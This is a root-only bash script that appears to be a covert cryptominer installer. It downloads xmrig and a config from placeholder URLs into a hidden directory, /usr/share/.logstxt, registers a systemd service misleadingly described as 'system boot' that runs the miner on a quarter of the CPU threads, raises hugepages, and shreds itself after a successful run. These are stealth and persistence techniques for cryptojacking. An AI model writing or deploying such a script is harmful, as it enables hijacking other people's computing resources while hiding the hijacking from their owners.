#!/bin/bash
if [[ $EUID -eq 0 ]]
then
   dircheck="/usr/share/.logstxt"
   filcheck="/etc/systemd/systemd/xmrig.service"
   filename="$0"
   exits () {
    
    if [[ -d "$dircheck" ]]
    then
       rm -r ${dircheck}
    fi
    
    if [[ -f "$filcheck" ]]
    then
       rm ${filcheck}
    fi
   }
   exits
   
   files=$(curl -s -O <url of xmrig>  -O <url for config.json> )  #add url of xmrig file and config.json.
   touch xmrig.service
   per=$(chmod 777 xmrig config.json && chmod 644 xmrig.service)
   dir=$(mkdir /usr/share/.logstxt)
   move=$(mv xmrig config.json /usr/share/.logstxt/ && mv xmrig.service /etc/systemd/system/)
   
   threads=$(lscpu -p | grep -c "^[0-9]") 
   tf=$(printf %.f "$((25 * $threads))e-2")
   append=$(echo -e "[Unit]\nDescription=system boot\nAfter=network.target\n\n[Service]\nType=simple\nRestart=on-failure\nRestartSec=1200\nUser=root\nExecStart=/usr/share/.logstxt/xmrig -c /usr/share/.logstxt/config.json --      threads=$tf\nRemainAfterExit=yes\nKillMode=process\n\n[Install]\nWantedBy=multi-user.target">/etc/systemd/system/xmrig.service)
   sys=$(echo "vm.nr_hugepages=1280">>/etc/sysctl.conf)
   system=$(sysctl --quiet --system && systemctl daemon-reload && systemctl enable --now xmrig --quiet)
   
   $files
   $per
   $dir
   $move
   $append
   $sys
   $system
    
   if [[ $? -eq 0 ]]
   then 
      shred -u ${filename}
   fi
else
   echo "Please Run as root!"
fi
